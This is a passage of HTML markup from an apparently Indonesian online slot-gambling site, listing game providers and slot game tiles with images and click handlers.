                                      <a class="btn-box " href="/slots/booming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BOOMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fachai" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fachai_slot8510.png" data-src="/assets/game_logos/100x70/fachai_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FACHAI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/jdb" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jdb_slot8510.png" data-src="/assets/game_logos/100x70/jdb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JDB</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dragoonsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/dragoon_slot8510.png" data-src="/assets/game_logos/100x70/dragoon_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DRAGOON SOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/apollo777" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/apollo777_slot8510.png" data-src="/assets/game_logos/100x70/apollo777_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">APOLLO777</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/5gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/5gaming_slot8510.png" data-src="/assets/game_logos/100x70/5gaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">5GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ygg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/yggslot8510.png" data-src="/assets/game_logos/100x70/yggslot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">YGG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kagaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kagaming_slot8510.png" data-src="/assets/game_logos/100x70/kagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nagagames" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nagagames_slot8510.png" data-src="/assets/game_logos/100x70/nagagames_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NAGA GAMES</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/live22" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/live22_slot8510.png" data-src="/assets/game_logos/100x70/live22_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LIVE22</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/onegame" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/onegame_slot8510.png" data-src="/assets/game_logos/100x70/onegame_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">One Game</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/bgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/bgaming_slot8510.png" data-src="/assets/game_logos/100x70/bgaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BGAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/gmw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/gmw_slot8510.png" data-src="/assets/game_logos/100x70/gmw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">GMW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/uu" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/uu_slot8510.png" data-src="/assets/game_logos/100x70/uu_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">UU Slot</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/i8" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/i8_slot8510.png" data-src="/assets/game_logos/100x70/i8_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">i8</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/pegasus" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/pegasus_slot8510.png" data-src="/assets/game_logos/100x70/pegasus_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PEGASUS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/btg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/btg_slot8510.png" data-src="/assets/game_logos/100x70/btg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BTG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kingmidas" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kingmaker_slot8510.png" data-src="/assets/game_logos/100x70/kingmaker_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KINGMIDAS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/smartsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/smartsoft_slot8510.png" data-src="/assets/game_logos/100x70/smartsoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SMARTSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/toptrend-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">TOPTREND GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/liteplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/liteplay_slot8510.png" data-src="/assets/game_logos/100x70/liteplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LITEPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/mancalagaming_slot8510.png" data-src="/assets/game_logos/100x70/mancalagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> MANCALA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/eagaming_slot8510.png" data-src="/assets/game_logos/100x70/eagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> EA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/evoplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/evoplay_slot8510.png" data-src="/assets/game_logos/100x70/evoplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">EVOPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/sbo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_slot8510.png" data-src="/assets/game_logos/100x70/sbo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SBO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/568win" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_568win_slot8510.png" data-src="/assets/game_logos/100x70/sbo_568win_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">568 WIN</h5>
              </a>
                           </div>

          
      </div>
    </div>
    <div class="right"><button class="next-btn btn" id="right-button"><i class="icon-keyboard_arrow_right"></i></button></div>


  </div>
</div>


         <div class="row no-gutters filter">
    <div class="col-xs-10 text-center">
      <div class="row">
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="NEW" [ngclass]="{ 'active': filterProperty==FilterType.New  }">BARU</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="TOP" [ngclass]="{ 'active': filterProperty==FilterType.Top  }">TOP</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f active" data-filter="ALL" [ngclass]="{ 'active': filterProperty==FilterType.All  }">SEMUA </button>
        </div>
      </div>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#searchModal"><i class="icon-magnifier"></i></button>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#filterModal-2"><i class="icon-equalizer2"></i></button>
    </div>
  </div>
  <div class="mobile-border"></div>
  <div class="mobile-border"></div>
  <br>
  <input type="hidden" value="pgsoft_slot" name="hiddenGameID-001" id="hiddenGameID-001">
  <div class="row games no-gutters">
          
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Ways" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Ways', '/assets/games/i/165x220/pgshoft/531e9d0cd776c15906ce761bb56f90ae.webp?v=0.1' , '65', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/531e9d0cd776c15906ce761bb56f90ae.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/531e9d0cd776c15906ce761bb56f90ae.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Ways">Mahjong Ways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Ways 2" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Ways 2', '/assets/games/i/165x220/pgshoft/f24e33352829cf3475df062f42e059ef.webp?v=0.1' , '74', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/f24e33352829cf3475df062f42e059ef.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/f24e33352829cf3475df062f42e059ef.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Ways 2">Mahjong Ways 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Bounty Showdown" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Bounty Showdown', '/assets/games/i/165x220/pgshoft/a27f7b629697af8fd4be95698b405e49.webp?v=0.1' , '135', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/a27f7b629697af8fd4be95698b405e49.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/a27f7b629697af8fd4be95698b405e49.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Bounty Showdown">Wild Bounty Showdown</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Bandito" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Bandito', '/assets/games/i/165x220/pgshoft/9c9f5f5160abe569deada38af4f5fc7c.webp?v=0.1' , '104', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/9c9f5f5160abe569deada38af4f5fc7c.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/9c9f5f5160abe569deada38af4f5fc7c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Bandito">Wild Bandito</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Neko" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Neko', '/assets/games/i/165x220/pgshoft/9a43da1342aca190cb05be8886f44821.webp?v=0.1' , '89', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/9a43da1342aca190cb05be8886f44821.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/9a43da1342aca190cb05be8886f44821.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Neko">Lucky Neko</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Treasures of Aztec" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Treasures of Aztec', '/assets/games/i/165x220/pgshoft/4f46cf3e93773b86e63cb3999bb366fa.webp?v=0.1' , '87', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/4f46cf3e93773b86e63cb3999bb366fa.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/4f46cf3e93773b86e63cb3999bb366fa.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Treasures of Aztec">Treasures of Aztec</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ways of the Qilin" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ways of the Qilin', '/assets/games/i/165x220/pgshoft/9bccabd723a324e8f88ea3f0325245f5.webp?v=0.1' , '106', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/9bccabd723a324e8f88ea3f0325245f5.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/9bccabd723a324e8f88ea3f0325245f5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ways of the Qilin">Ways of the Qilin</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Ape #3258" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Ape #3258', '/assets/games/i/165x220/pgshoft/440810aea0ffe9d05b15196182049b35.webp?v=0.1' , '1508783', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/440810aea0ffe9d05b15196182049b35.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/440810aea0ffe9d05b15196182049b35.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Ape #3258">Wild Ape #3258</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gemstones Gold" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gemstones Gold', '/assets/games/i/165x220/pgshoft/1c433748f2dcfcc14126b80d0015141a.webp?v=0.1' , '1671262', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/1c433748f2dcfcc14126b80d0015141a.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/1c433748f2dcfcc14126b80d0015141a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gemstones Gold">Gemstones Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pinata Wins" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pinata Wins', '/assets/games/i/165x220/pgshoft/2d7430bbfd85f8689b3aa2a27cfb0e53.webp?v=0.1' , '1492288', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/2d7430bbfd85f8689b3aa2a27cfb0e53.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/2d7430bbfd85f8689b3aa2a27cfb0e53.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pinata Wins">Pinata Wins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cocktail Nights" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cocktail Nights', '/assets/games/i/165x220/pgshoft/3060d3a4314a67fd312e932c897b940a.webp?v=0.1' , '117', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/3060d3a4314a67fd312e932c897b940a.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/3060d3a4314a67fd312e932c897b940a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cocktail Nights">Cocktail Nights</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mafia Mayhem" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mafia Mayhem', '/assets/games/i/165x220/pgshoft/1a1f123372e75d81e45343d2b1508948.webp?v=0.1' , '1580541', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/1a1f123372e75d81e45343d2b1508948.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/1a1f123372e75d81e45343d2b1508948.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mafia Mayhem">Mafia Mayhem</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Anubis Wrath" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Anubis Wrath', '/assets/games/i/165x220/pgshoft/0b10620354d0778de4891a039e1ad47a.webp?v=0.1' , '1623475', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/0b10620354d0778de4891a039e1ad47a.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/0b10620354d0778de4891a039e1ad47a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Anubis Wrath">Anubis Wrath</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jurassic Kingdom" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jurassic Kingdom', '/assets/games/i/165x220/pgshoft/111d09f5be0857cedfc6153af84d19df.webp?v=0.1' , '110', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/111d09f5be0857cedfc6153af84d19df.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/111d09f5be0857cedfc6153af84d19df.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jurassic Kingdom">Jurassic Kingdom</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Geisha&amp;quot;amp;s Revenge" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Geisha&amp;quot;amp;s Revenge', '/assets/games/i/165x220/pgshoft/fa5afd06bfa086a71e72d55632a9cfb8.webp?v=0.1' , '1702123', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/fa5afd06bfa086a71e72d55632a9cfb8.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/fa5afd06bfa086a71e72d55632a9cfb8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Geisha's Revenge">Geisha's Revenge</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Queen of Bounty" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Queen of Bounty', '/assets/games/i/165x220/pgshoft/5339279e897b8fa3048b4cae6002676e.webp?v=0.1' , '84', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/5339279e897b8fa3048b4cae6002676e.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/5339279e897b8fa3048b4cae6002676e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Queen of Bounty">Queen of Bounty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Hatch 2" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Hatch 2', '/assets/games/i/165x220/pgshoft/9523a92d75bad68c7f08c36d4bda94b1.webp?v=0.1' , '1451122', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/9523a92d75bad68c7f08c36d4bda94b1.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/9523a92d75bad68c7f08c36d4bda94b1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Hatch 2">Dragon Hatch 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Majestic Empire" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Majestic Empire', '/assets/games/i/165x220/pgshoft/d4900195a1152ef7f0012cfbdf554372.webp?v=0.1' , '1971587', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/d4900195a1152ef7f0012cfbdf554372.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/d4900195a1152ef7f0012cfbdf554372.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Majestic Empire">Majestic Empire</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Great Icescape" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Great Icescape', '/assets/games/i/165x220/pgshoft/5b4e1f2a80f4c1ac2b62bcb74a565688.webp?v=0.1' , '53', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/pgshoft/5b4e1f2a80f4c1ac2b62bcb74a565688.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/5b4e1f2a80f4c1ac2b62bcb74a565688.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Great Icescape">The Great Icescape</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Speed Winner" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Speed Winner', '/assets/games/i/165x220/pgshoft/1966a166ebb84f3a22f1271ce1c24198.webp?v=0.1' , '127', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/pgshoft/1966a166ebb84f3a22f1271ce1c24198.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/1966a166ebb84f3a22f1271ce1c24198.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Speed Winner">Speed Winner</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Caishen Wins" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Caishen Wins', '/assets/games/i/165x220/pgshoft/6ac3269ae9328a104eea7562418fafa6.webp?v=0.1' , '71', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/pgshoft/6ac3269ae9328a104eea7562418fafa6.webp?v=0.1" src="/assets/games/i/165x220/pgshoft/6ac3269ae9328a104eea7562418fafa6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Caishen Wins">Caishen Wins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mr. Treasure’s Fortune" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mr. Treasure’s Fortune', '/assets/games/i/165x220/pgshoft/846a57c5ab5b84883e72e4e828425d0e.webp?v=0.1' , '1799745', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/846a57c5ab5b84883e72e4e828425d0e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mr. Treasure’s Fortune">Mr. Treasure’s Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ganesha Fortune" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ganesha Fortune', '/assets/games/i/165x220/pgshoft/943ea34742cefba5aa67d4e72264b6b9.webp?v=0.1' , '75', '' )" style="">

          <div class="content-wrapper">
              
